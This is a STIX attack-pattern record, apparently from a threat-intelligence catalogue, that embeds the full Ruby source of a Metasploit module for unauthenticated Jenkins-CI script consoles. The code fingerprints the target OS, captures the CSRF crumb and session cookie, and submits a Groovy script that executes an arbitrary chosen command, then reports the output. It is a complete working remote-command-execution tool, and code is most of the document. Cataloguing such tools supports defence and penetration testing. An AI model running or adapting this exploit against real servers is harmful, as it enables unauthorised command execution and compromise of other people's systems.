{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff43aacd-8504-454d-8e1c-abd387f1d80c",
    "created": "2024-08-14T16:30:28.498926Z",
    "modified": "2024-08-14T16:30:28.49893Z",
    "name": "Jenkins-CI Unauthenticated Script-Console Scanner",
    "description": " This module scans for unauthenticated Jenkins-CI script consoles and executes the specified command. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jenkins_command.rb",
            "external_id": "jenkins_command.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.jenkins.io/security/advisory/2015-11-11/"
        },
        {
            "source_name": "reference",
            "url": "https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/"
        },
        {
            "source_name": "reference",
            "url": "https://www.jenkins.io/doc/book/managing/script-console/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nrequire 'cgi'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',\n      'Description' => %q{\n        This module scans for unauthenticated Jenkins-CI script consoles and\n        executes the specified command.\n      },\n      'Author'      =>\n        [\n          'altonjx',\n          'Jeffrey Cap'\n        ],\n      'References'  =>\n        [\n          ['CVE', '2015-8103'], # see link and validate, https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/ states this is another issue\n          ['URL', 'https://www.jenkins.io/security/advisory/2015-11-11/'],\n          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],\n          ['URL', 'https://www.jenkins.io/doc/book/managing/script-console/'],\n        ],\n      'License'     => MSF_LICENSE\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),\n        OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),\n      ])\n  end\n\n  def fingerprint_os(ip)\n    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,\"systemInfo\")})\n\n    # Verify that we received a proper systemInfo response\n    unless res && res.body.to_s.length > 0\n      vprint_error(\"#{peer} - The server did not reply to our systemInfo request\")\n      return\n    end\n\n    unless res.body.index(\"System Properties\") &&\n           res.body.index(\"Environment Variables\")\n      if res.body.index('Remember me on this computer')\n        vprint_error(\"#{peer} This Jenkins-CI system requires authentication\")\n      else\n        vprint_error(\"#{peer} This system is not running Jenkins-CI at #{datastore['TARGETURI']}\")\n      end\n      return\n    end\n\n    host_info = {}\n    if (res.body =~ /\"\\.crumb\", \"([a-z0-9]*)\"/)\n      print_status(\"#{peer} Using CSRF token: '#{$1}'\")\n      host_info[:crumb] = $1\n\n      sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]\n      host_info[:cookie] = \"#{sessionid}\"\n    end\n\n    os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first\n    host_info[:prefix] = os_info.index(\">Windows\") ? \"cmd.exe /c \" : \"\"\n    host_info\n  end\n\n  def run_host(ip)\n    command = datastore['COMMAND'].gsub(\"\\\\\", \"\\\\\\\\\\\\\")\n\n    host_info = fingerprint_os(ip)\n    return if host_info.nil?\n    prefix = host_info[:prefix]\n\n    request_parameters = {\n      'uri'       => normalize_uri(target_uri.path,\"script\"),\n      'method'    => 'POST',\n      'ctype'     => 'application/x-www-form-urlencoded',\n      'vars_post' =>\n        {\n          'script' => \"def sout = new StringBuffer(), serr = new StringBuffer()\\r\\ndef proc = '#{prefix} #{command}'.execute()\\r\\nproc.consumeProcessOutput(sout, serr)\\r\\nproc.waitForOrKill(1000)\\r\\nprintln \\\"out> $sout err> $serr\\\"\\r\\n\",\n          'Submit' => 'Run'\n        }\n    }\n    request_parameters['cookie'] = host_info[:cookie] unless host_info[:cookie].nil?\n    request_parameters['vars_post']['.crumb'] = host_info[:crumb] unless host_info[:crumb].nil?\n    res = send_request_cgi(request_parameters)\n\n    unless res && res.body.to_s.length > 0\n      vprint_error(\"#{peer} No response received from the server.\")\n      return\n    end\n\n    plugin_output, command_output = pattern_extract(/<pre>(.*?)<\\/pre>/m, res.body.to_s)\n\n    if plugin_output !~ /Jenkins\\.instance\\.pluginManager\\.plugins/\n      vprint_error(\"#{peer} The server returned an invalid response.\")\n      return\n    end\n\n    # The output is double-HTML encoded\n    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).\n             gsub(/\\s*(out|err)>\\s*/m, '').\n             strip\n\n    if output =~ /^java\\.[a-zA-Z\\.]+\\:\\s*([^\\n]+)\\n/\n      output = $1\n      print_good(\"#{peer} The server is vulnerable, but the command failed: #{output}\")\n    else\n      output.split(\"\\n\").each do |line|\n        print_good(\"#{peer} #{line.strip}\")\n      end\n    end\n\n    report_vulnerable(output)\n\n  end\n\n  def pattern_extract(pattern, buffer)\n    buffer.to_s.scan(pattern).map{ |m| m.first }\n  end\n\n  def report_vulnerable(result)\n    report_vuln(\n      :host   => rhost,\n      :port   => rport,\n      :proto  => 'tcp',\n      :sname  => ssl ? 'https' : 'http',\n      :name   => self.name,\n      :info   => result,\n      :refs   => self.references,\n      :exploited_at => Time.now.utc\n    )\n  end\nend\n"
}